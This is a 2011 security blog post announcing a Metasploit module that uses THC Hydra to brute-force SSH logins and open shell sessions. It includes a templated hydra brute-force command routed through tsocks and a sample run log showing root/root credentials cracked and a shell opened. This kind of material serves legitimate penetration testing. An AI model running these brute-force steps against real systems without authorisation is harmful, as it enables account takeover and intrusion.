---
layout: post
title: Brute-forcing SSH accounts with THC Hydra and Metasploit
date: '2011-08-05T19:35:00.001+02:00'
author: Xavier Garcia
tags:
- ssh
- Metasploit
- hydra
modified_time: '2011-08-05T19:36:55.383+02:00'
blogger_id: tag:blogger.com,1999:blog-8534555958859253862.post-369143925411102477
blogger_orig_url: http://www.shellguardians.com/2011/08/brute-forcing-ssh-accounts-with-thc.html
---
I have written a simple Auxiliary module for [Metasploit](http://www.metasploit.com/) that permits to brute-force SSH accounts with [THC Hydra](http://thc.org/thc-hydra/) and load the sessions in  [Metasploit](h
ttp://www.metasploit.com/).

The approach is as simple as executing [Hydra](http://thc.org/thc-hydra/) from the shell and recovering the valid credentials with a regular expression. After this, we o nly have to open a new session with the  SSH libraries available in the framework.

As a side note, this module cannot be used through pivoting like any external program, but the code can be modified to call hydra with a wrapper like [tsocks](http://tsocks.sourceforge.net/) and then scan trough the [Socks4a](http://www.metasploit.com/modules/auxiliary/server/socks4a) server module.

```shell
$ tsocks hydra -f -o {logfile} -w {timeout} -t {threads} \
  -s {rport} -C{credentials} {ip}  ssh2
```
**NOTE**: Some of the code is borrowed from the existing SSH auxiliary modules.  

Example output:

```
msf auxiliary(ssh_hydra) > info
  
    Name: Scanning SSH servers with Hydra  
    Module: auxiliary/scanner/ssh/ssh_hydra  
    Version: 1  
    License: Metasploit Framework License (BSD)  
    Rank: Normal  
  
Provided by:  
  ghosthunter  
  
Basic options:  
  Name         Current Setting   Required  Description  
  ----         ---------------   --------  -----------  
  CREDENTIALS  /tmp/credentials  yes       colon separated list of credentials  
  RHOSTS       X.X.X.X           yes       The target address range or CIDR identifier  
  RPORT        22                yes       The target port  
  TASKS        8                 yes       number of connexions in parallel  
  TIMEOUT      30                yes       timeout for the responses  
  
Description:  
This module will launch THC hydra to brute-force the ssh credentials and then open the
sessions with the valid ones.  
  
  
msf auxiliary(ssh_hydra) > run  
  
[*] X.X.X.X:22, SSH server version: SSH- 1.99-OpenSSH_4.4  
[*] Attacking X.X.X.X  
[*] X.X.X.X:22  /tmp/credentials - Calling Hydra  
  
[*] Valid credentials found: X.X.X.X root root  
[*] Command shell session 1 opened (Y.Y.Y.Y:35009 -> X.X.X.X:22) at Fri Aug 05 19:06:00 +0200 2011  
[*] Scanned 1 of 1 hosts (100% complete)  
[*] Auxiliary module execution completed
```
  
The module can be found here: [ssh_hydra.rb](http://ghosthunter.googlecode.com/svn/trunk/metasploit/auxiliary/scanner/ssh/ssh_hydra.rb)
